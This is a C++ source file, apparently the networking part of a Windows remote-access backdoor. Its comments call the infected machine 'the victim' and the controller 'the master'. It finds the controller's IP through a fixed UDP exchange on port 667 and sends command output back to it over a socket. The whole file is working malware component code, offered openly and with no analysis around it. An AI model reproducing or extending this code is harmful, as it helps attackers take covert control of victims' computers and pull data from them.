#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include"Network.h"
#include<WinSock2.h>
#include<Ws2tcpip.h>
#include<windows.h>
#pragma comment(lib, "ws2_32.lib")

#include "Utils.h"

uint32_t findMastersIP()
{
    sockaddr_in sockinfo;
    sockaddr_in mastersinfo;
    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s == INVALID_SOCKET)
        std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
    int error;

    std::string message, response;
    char* buf = new char[65536];
    int fromlen = sizeof(mastersinfo);

    sockinfo.sin_addr.s_addr = getPrivateIP();
    sockinfo.sin_port = htons(667);
    sockinfo.sin_family = AF_INET;
    
    error = 1;
    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&error, sizeof(error)))
        std::cout << "Sockopt error <" << WSAGetLastError() << ">" << std::endl;

    if(bind(s, (sockaddr*)&sockinfo, sizeof sockinfo) < 0)
        std::cout << "Bind error <" << WSAGetLastError() << ">" << std::endl;

    /*fixed messages for my "protocol"*/
    message = "What is your IP?";
    response = "My IP";

    /*wait for the master to ask me to connect*/
    do {
        memset(buf, 0, 65536);
        error = recvfrom(s, buf, 65536, 0, (sockaddr*)&mastersinfo, &fromlen);
        std::cout << buf << std::endl;
        if (error < 0)
        {
            std::cout << "Recieve error <" << WSAGetLastError() << ">" << std::endl;
            goto errorLable;
        }
    } while (!std::string(buf)._Equal(message));

    /*the victim will broadcast to port 667 that he needs the master's ip*/
    sockinfo.sin_addr.s_addr = mastersinfo.sin_addr.s_addr;
    sockinfo.sin_port = mastersinfo.sin_port;
    sockinfo.sin_family = mastersinfo.sin_family;

    error = sendto(s, response.c_str(), response.size(), 0, (sockaddr*)&sockinfo, sizeof(sockinfo));
    if (error < 0)
        std::cout << "Send error <" << WSAGetLastError() << ">" << std::endl;

errorLable:
    delete[] buf;
    closesocket(s);
    return mastersinfo.sin_addr.s_addr;
}

int sendStdOut(SOCKET s, std::string& message)
{
    std::string part;
    if (message.size() == 0)
    {
        part = "no output";
        if (!send(s, part.c_str(), part.size(), 0))
            return 1;
    }

    /*spilitting messages to 4096*/
    while (message.size() >= 4096)
    {
        part = message.substr(0, 4095);
        message = message.substr(4095);
        if(!send(s, part.c_str(), part.size(), 0))
            return 1;
    }

    if(!send(s, message.c_str(), message.size(), 0))
        return 1;

    return 0;
}
